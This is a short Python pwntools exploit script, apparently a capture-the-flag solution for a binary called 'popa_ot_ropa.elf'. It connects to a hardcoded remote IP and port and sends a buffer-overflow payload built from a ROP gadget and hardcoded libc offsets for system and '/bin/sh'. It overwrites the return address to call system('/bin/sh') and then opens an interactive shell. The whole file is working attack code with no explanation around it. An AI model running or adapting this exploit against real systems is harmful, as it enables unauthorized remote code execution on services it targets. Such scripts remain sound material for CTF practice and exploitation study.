#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./popa_ot_ropa.elf')


host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11673)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


io = start()



system_    = 0x7ffff7de3000 + 0x48F20
g_pop_rax  = 0x4011B3
binsh_ptr =  0x7ffff7de3000 + 0x18A156


pl  = b'/bin/sh\x00' + b'A'*56
pl += p64(1)          # rbp
pl += p64(g_pop_rax)  # ret addr
pl += p64(binsh_ptr)  # ptr to "/bin/sh\x00"
pl += p64(0x401169)   # return to call _system


io.sendline(pl)

io.interactive()


# s 0x00007fffffffdfd8